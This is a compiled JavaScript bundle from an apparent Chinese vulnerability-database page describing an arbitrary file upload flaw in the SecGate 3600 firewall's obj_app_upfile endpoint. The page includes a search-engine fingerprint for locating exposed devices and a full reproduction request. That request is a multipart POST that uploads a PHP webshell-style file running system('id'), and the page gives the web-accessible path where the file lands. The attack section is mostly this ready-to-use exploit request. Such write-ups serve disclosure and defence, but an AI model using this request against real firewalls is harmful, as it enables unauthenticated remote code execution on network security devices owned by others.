(window.webpackJsonp=window.webpackJsonp||[]).push([[117],{1522:function(s,a,t){s.exports=t.p+"assets/img/1649350287241-cdcc761f-1cb6-4bb5-befa-ed101065a8bf.c86a9913.png"},1523:function(s,a,t){s.exports=t.p+"assets/img/1649487600829-f37244cf-d92a-4c43-845b-42b510536d21.f30ea06d.png"},1524:function(s,a,t){s.exports=t.p+"assets/img/1649487880029-bf876c08-7096-45a6-aafd-a94d7444bf9a.709ebbb7.png"},1525:function(s,a,t){s.exports=t.p+"assets/img/1649488185594-245e1a3e-604c-42a3-8096-c5e94a6315bd.bf707911.png"},3013:function(s,a,t){"use strict";t.r(a);var n=t(64),e=Object(n.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"网神-secgate-3600-防火墙-obj-app-upfile-任意文件上传漏洞"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#网神-secgate-3600-防火墙-obj-app-upfile-任意文件上传漏洞"}},[s._v("#")]),s._v(" 网神 SecGate 3600 防火墙 obj_app_upfile 任意文件上传漏洞")]),s._v(" "),a("h2",{attrs:{id:"漏洞描述"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),a("p",[s._v("网神 SecGate 3600 防火墙 obj_app_upfile接口存在任意文件上传漏洞，攻击者通过构造特殊请求包即可获取服务器权限")]),s._v(" "),a("h2",{attrs:{id:"漏洞影响"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v("网神 SecGate 3600 防火墙 ")]),a("br"),s._v(" "),a("h2",{attrs:{id:"网络测绘"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v('fid="1Lh1LHi6yfkhiO83I59AYg==" ')]),a("br"),s._v(" "),a("h2",{attrs:{id:"漏洞复现"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),a("p",[s._v("登录页面")]),s._v(" "),a("p",[a("img",{attrs:{src:t(1522),alt:"img"}})]),s._v(" "),a("p",[s._v("出现漏洞的文件 webui/modules/object/app.mds")]),s._v(" "),a("p",[a("img",{attrs:{src:t(1523),alt:"img"}})]),s._v(" "),a("p",[s._v("代码中没有对文件调用进行鉴权，且文件上传路径为可访问路径，造成任意文件上传")]),s._v(" "),a("p",[a("img",{attrs:{src:t(1524),alt:"img"}})]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[s._v('POST /?g=obj_app_upfile HTTP/1.1\nHost: \nAccept: */*\nAccept-Encoding: gzip, deflate\nContent-Length: 574\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc\nUser-Agent: Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)\n\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\nContent-Disposition: form-data; name="MAX_FILE_SIZE"\n\n10000000\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\nContent-Disposition: form-data; name="upfile"; filename="vulntest.php"\nContent-Type: text/plain\n\n'),a("span",{pre:!0,attrs:{class:"token php language-php"}},[a("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("<?php")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("system")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"id"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("unlink")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token constant"}},[s._v("__FILE__")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),a("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("?>")])]),s._v('\n\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\nContent-Disposition: form-data; name="submit_post"\n\nobj_app_upfile\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\nContent-Disposition: form-data; name="__hash__"\n\n0b9d6b1ab7479ab69d9f71b05e0e9445\n------WebKitFormBoundaryJpMyThWnAxbcBBQc--\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br")])]),a("p",[s._v("默认上传路径 /secgate/webui/attachements/ ， 访问  attachements/xxx.php 文件")]),s._v(" "),a("p",[a("img",{attrs:{src:t(1525),alt:"img"}})])],1)}),[],!1,null,null,null);a.default=e.exports}}]);